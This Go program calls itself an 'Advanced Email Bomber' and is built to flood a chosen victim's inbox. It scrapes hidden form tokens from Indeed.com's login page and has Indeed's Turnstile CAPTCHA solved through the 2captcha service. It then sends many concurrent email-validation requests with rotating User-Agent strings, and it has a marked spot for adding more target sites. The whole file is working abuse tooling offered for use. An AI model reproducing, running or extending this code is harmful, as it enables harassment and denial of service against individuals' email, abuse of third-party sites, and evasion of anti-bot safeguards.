package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// --- User-Agent List ---
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
}

// --- Struct Definitions ---
type CaptchaInfo struct {
	Type    string // Can be "recaptcha", "turnstile", or ""
	SiteKey string // The sitekey for the CAPTCHA
	PageURL string // The page URL where the CAPTCHA appears
}

type AttackVector struct {
	Name         string
	PayloadURL   string
	Captcha      CaptchaInfo
	Setup        func(client *http.Client) (map[string]string, error)
	BuildPayload func(targetEmail, captchaToken string, setupData map[string]string) (io.Reader, string, error)
}

// --- Helper Functions ---
func randString(n int, runes []rune) string {
	s := make([]rune, n)
	for i := range s {
		s[i] = runes[rand.Intn(len(runes))]
	}
	return string(s)
}

// --- 2Captcha Section ---
func solveCaptcha(client *http.Client, captchaAPIKey string, captchaType string, siteKey string, pageURL string) (string, error) {
	var method string
	switch captchaType {
	case "recaptcha":
		method = "userrecaptcha"
	case "turnstile":
		method = "turnstile"
	default:
		return "", fmt.Errorf("unsupported captcha type: %s", captchaType)
	}

	data := url.Values{"key": {captchaAPIKey}, "method": {method}, "sitekey": {siteKey}, "pageurl": {pageURL}, "json": {"1"}}
	resp, err := client.PostForm("https://2captcha.com/in.php", data)
	if err != nil { return "", err }
	defer resp.Body.Close()
	var result map[string]interface{}
	body, _ := io.ReadAll(resp.Body)
	if err := json.Unmarshal(body, &result); err != nil { return "", err }
	if status, ok := result["status"].(float64); !ok || status != 1 { return "", fmt.Errorf("2captcha service error: %v", result["request"]) }
	
	captchaID := result["request"].(string)
	log.Printf("[%s] Successfully got CAPTCHA ID: %s. Now polling for token...", captchaType, captchaID)
	
	for i := 0; i < 24; i++ {
		time.Sleep(5 * time.Second)
		reqURL := fmt.Sprintf("https://2captcha.com/res.php?key=%s&action=get&id=%s&json=1", captchaAPIKey, captchaID)
		res, err := client.Get(reqURL)
		if err != nil { continue }
		defer res.Body.Close()
		var poll map[string]interface{}
		body, _ := io.ReadAll(res.Body)
		if err := json.Unmarshal(body, &poll); err != nil { return "", err }
		if status, ok := poll["status"].(float64); ok && status == 1 {
			token := poll["request"].(string)
			log.Printf("[%s] Successfully got CAPTCHA token.", captchaType)
			return token, nil
		}
	}
	return "", fmt.Errorf("captcha not solved in time")
}

// --- Setup and Payload Builders ---

// Setup function for Indeed.com to scrape necessary tokens
func setupIndeed(client *http.Client) (map[string]string, error) {
	log.Println("[Indeed Setup] Fetching login page to scrape tokens...")
	resp, err := client.Get("https://secure.indeed.com/account/login")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	html := string(body)

	// Regex to find hidden input values
	re := regexp.MustCompile(`name="([^"]+)"\s+value="([^"]+)"`)
	matches := re.FindAllStringSubmatch(html, -1)

	tokens := make(map[string]string)
	for _, match := range matches {
		if match[1] == "surftok" || match[1] == "form_tk" {
			tokens[match[1]] = match[2]
			log.Printf("[Indeed Setup] Found token: %s", match[1])
		}
	}
	
	if len(tokens) < 2 {
		return nil, fmt.Errorf("could not find all required tokens (surftok, form_tk) on Indeed page")
	}

	return tokens, nil
}


func buildIndeedPayload(email, captchaToken string, setupData map[string]string) (io.Reader, string, error) {
	data := url.Values{
		"__email":              {email},
		"cf-turnstile-response":{captchaToken},
		"surftok":              {setupData["surftok"]},
		"form_tk":              {setupData["form_tk"]},
		"co":                   {"SE"}, // Country can be customized
		"hl":                   {"sv_SE"}, // Language can be customized
	}
	return strings.NewReader(data.Encode()), "application/x-www-form-urlencoded", nil
}


// --- Core Attack Function ---
func runAttack(wg *sync.WaitGroup, client *http.Client, vector AttackVector, targetEmail string, captchaKey string) {
	defer wg.Done()
	log.Printf("[STARTING] Attack on: %s", vector.Name)
	
	setupData := make(map[string]string)
	var err error

	// Step 1: Run setup function if it exists
	if vector.Setup != nil {
		setupData, err = vector.Setup(client)
		if err != nil {
			log.Printf("[ERROR] Setup for %s failed: %v", vector.Name, err)
			return
		}
	}

	captchaToken := ""
	// Step 2: Solve CAPTCHA if required
	if vector.Captcha.Type != "" {
		if captchaKey == "" { log.Printf("[ERROR] %s requires a 2Captcha API key.", vector.Name); return }
		captchaToken, err = solveCaptcha(client, captchaKey, vector.Captcha.Type, vector.Captcha.SiteKey, vector.Captcha.PageURL)
		if err != nil { log.Printf("[ERROR] Could not solve CAPTCHA for %s: %v", vector.Name, err); return }
	}

	// Step 3: Build and send the main payload
	payloadReader, contentType, err := vector.BuildPayload(targetEmail, captchaToken, setupData)
	if err != nil { log.Printf("[ERROR] Could not build payload for %s: %v", vector.Name, err); return }
	
	req, err := http.NewRequest("POST", vector.PayloadURL, payloadReader)
	if err != nil { log.Printf("[ERROR] Could not create request for %s: %v", vector.Name, err); return }
	
	randomUA := userAgents[rand.Intn(len(userAgents))]
	req.Header.Set("User-Agent", randomUA)
	req.Header.Set("Content-Type", contentType)

	resp, err := client.Do(req)
	if err != nil { log.Printf("[FAILURE] Request to %s failed: %v", vector.Name, err); return }
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 { log.Printf("[SUCCESS] Request to %s sent successfully. Status: %d", vector.Name, resp.StatusCode)
	} else { log.Printf("[FAILURE] Request to %s failed with status. Status: %d", vector.Name, resp.StatusCode) }
}

// --- Interactive Prompt ---
func promptForInput(reader *bufio.Reader, prompt string) string {
	fmt.Print(prompt)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

// --- Main Function ---
func main() {
	rand.Seed(time.Now().UnixNano())
	log.Println("--- Advanced Email Bomber (Upgraded Version) ---")
	reader := bufio.NewReader(os.Stdin)
	targetEmail := promptForInput(reader, "Enter the target email address: ")
	if targetEmail == "" { log.Fatal("Error: Target email cannot be empty.") }
	captchaKey := promptForInput(reader, "Enter your 2captcha.com API key (optional, press Enter to skip): ")
	attacksPerSiteStr := promptForInput(reader, "Enter the number of attacks PER SITE: ")
	attacksPerSite, err := strconv.Atoi(attacksPerSiteStr)
	if err != nil || attacksPerSite <= 0 { log.Fatal("Error: Invalid number of attacks.") }

	// --- THIS IS WHERE YOU ADD YOUR NEW SITES ---
	attackVectors := []AttackVector{
		{
			Name:         "Indeed.com - Email Validation",
			PayloadURL:   "https://secure.indeed.com/account/emailvalidation",
			Captcha: CaptchaInfo{
				Type:    "turnstile",
				SiteKey: "0x4AAAAAAAC3g0t7erT02lA5", // Indeed's Turnstile Sitekey
				PageURL: "https://secure.indeed.com/account/login",
			},
			Setup:        setupIndeed,
			BuildPayload: buildIndeedPayload,
		},
	}

	totalAttacks := attacksPerSite * len(attackVectors)
	log.Printf("Target Email: %s | Attacks Per Site: %d | Total Attacks: %d", targetEmail, attacksPerSite, totalAttacks)
	
	var wg sync.WaitGroup
	jar, _ := cookiejar.New(nil)
	tr := &http.Transport{TLSClientConfig: &tls.Config{NextProtos: []string{"http/1.1"}}}
	client := &http.Client{Jar: jar, Timeout: 120 * time.Second, Transport: tr}
	
	for _, vector := range attackVectors {
		for i := 0; i < attacksPerSite; i++ {
			wg.Add(1)
			go runAttack(&wg, client, vector, targetEmail, captchaKey)
			time.Sleep(50 * time.Millisecond)
		}
	}
	wg.Wait()
	log.Println("--- Operation Finished ---")
}
